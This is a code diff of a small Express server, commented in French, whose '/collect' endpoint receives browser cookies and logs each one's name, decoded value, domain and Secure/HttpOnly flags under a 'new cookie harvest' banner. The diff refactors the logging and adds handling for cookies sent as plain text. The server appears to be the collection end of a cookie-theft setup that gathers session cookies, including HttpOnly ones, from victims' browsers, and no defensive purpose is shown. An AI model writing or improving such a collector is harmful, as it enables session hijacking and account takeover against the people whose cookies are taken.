@@ -6,8 +6,8 @@ app.use(express.json());
 function safeDecode(value) {
   try {
     return decodeURIComponent(value);
-  } catch (e) {
-    return value; // au cas où ce n'est pas encodé
+  } catch {
+    return value;
   }
 }
 
@@ -15,29 +15,32 @@ app.post("/collect", (req, res) => {
   const cookies = req.body.cookies;
 
   const now = new Date();
-  const date = now.toLocaleDateString("fr-FR");
-  const time = now.toLocaleTimeString("fr-FR");
+  console.log("\n==============================");
+  console.log("🍪 NOUVELLE RÉCUPÉRATION");
+  console.log("📅", now.toLocaleDateString("fr-FR"));
+  console.log("⏰", now.toLocaleTimeString("fr-FR"));
+  console.log("==============================");
 
-  console.log("\n=======================================");
-  console.log("🍪 NOUVELLE RÉCUPÉRATION DE COOKIES");
-  console.log(`📅 Date : ${date}`);
-  console.log(`⏰ Heure : ${time}`);
-  console.log("=======================================\n");
-
-  if (!cookies || cookies.length === 0) {
-    console.log("⚠️ Aucun cookie reçu");
-  } else {
+  // 🟢 CAS 1 : cookies est un TABLEAU (cas normal)
+  if (Array.isArray(cookies)) {
     cookies.forEach((cookie, index) => {
-      const decodedValue = safeDecode(cookie.value);
-
-      console.log(`Cookie ${index + 1}`);
-      console.log(`Nom       : ${cookie.name}`);
-      console.log(`Valeur    : ${decodedValue}`);
-      console.log(`Domaine   : ${cookie.domain}`);
-      console.log(`Secure    : ${cookie.secure}`);
-      console.log(`HttpOnly  : ${cookie.httpOnly}`);
-      console.log("---------------------------------------");
+      console.log(`\nCookie ${index + 1}`);
+      console.log("Nom      :", cookie.name);
+      console.log("Valeur   :", safeDecode(cookie.value));
+      console.log("Domaine  :", cookie.domain);
+      console.log("Secure   :", cookie.secure);
+      console.log("HttpOnly :", cookie.httpOnly);
     });
+
+  // 🟡 CAS 2 : cookies est une STRING
+  } else if (typeof cookies === "string") {
+    console.log("\n⚠️ Cookies reçus sous forme de texte");
+    console.log(safeDecode(cookies));
+
+  // 🔴 CAS 3 : rien reçu
+  } else {
+    console.log("\n❌ Aucun cookie valide reçu");
+    console.log("Type reçu :", typeof cookies);
   }
 
   res.json({ status: "ok" });
